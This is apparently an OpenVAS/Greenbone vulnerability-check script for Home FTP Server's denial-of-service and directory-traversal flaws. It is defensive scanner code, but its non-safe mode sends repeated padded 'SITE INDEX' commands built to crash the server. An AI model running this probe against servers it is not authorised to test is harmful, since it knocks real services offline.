# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900260");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2009-11-30 15:32:46 +0100 (Mon, 30 Nov 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-01-26 17:54:00 +0000 (Fri, 26 Jan 2024)");
  script_cve_id("CVE-2009-4051", "CVE-2009-4053");
  script_name("Home FTp Server DOS And Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/37381");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37033");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2009/Nov/111");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/3269");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("FTP");
  script_dependencies("secpod_home_ftp_server_detect.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("HomeFTPServer/Ver");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause a Denial of Service
  or directory traversal attacks on the affected application.");

  script_tag(name:"affected", value:"Home FTP Server version 1.10.1.139 and prior.");

  script_tag(name:"insight", value:"- An error in the handling of multiple 'SITE INDEX' commands can be exploited
  to stop the server.

  - An input validation error when handling the MKD FTP command can be exploited
  to create directories outside the FTP root or create files with any contents
  in arbitrary directories via directory traversal sequences in a file upload request.");

  script_tag(name:"solution", value:"Upgrade to Home FTP Server version 1.10.3.144 or later.");

  script_tag(name:"summary", value:"Home Ftp Server is prone to Denial of Service and Directory Traversal Vulnerabilities using invalid commands.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("version_func.inc");
include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

hftpPort = ftp_get_port(default:21);
if("Home Ftp Server" >!< ftp_get_banner(port:hftpPort)){
  exit(0);
}

if(!safe_checks())
{
  soc1 = open_sock_tcp(hftpPort);
  if(soc1)
  {

    kb_creds = ftp_get_kb_creds();
    user = kb_creds["login"];
    pass = kb_creds["pass"];

    ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
    test_string= crap(length:30, data:"a");

    if(ftplogin)
    {
      for( j = 1; j <= 11; j++ )
      {
        send(socket:soc1, data:string("SITE INDEX ", test_string * j ,"\r\n"));
        soc2 = open_sock_tcp(hftpPort);
        resp = ftp_recv_line(socket:soc2);
        if(!resp)
        {
          security_message(hftpPort);
          close(soc2);
          exit(0);
        }
        close(soc2);
      }
    }
    close(soc1);
  }
}

hftpVer = get_kb_item("HomeFTPServer/Ver");
if(!hftpVer){
  exit(0);
}

if(version_is_less_equal(version:hftpVer, test_version:"1.10.1.139")){
  security_message(hftpPort);
}
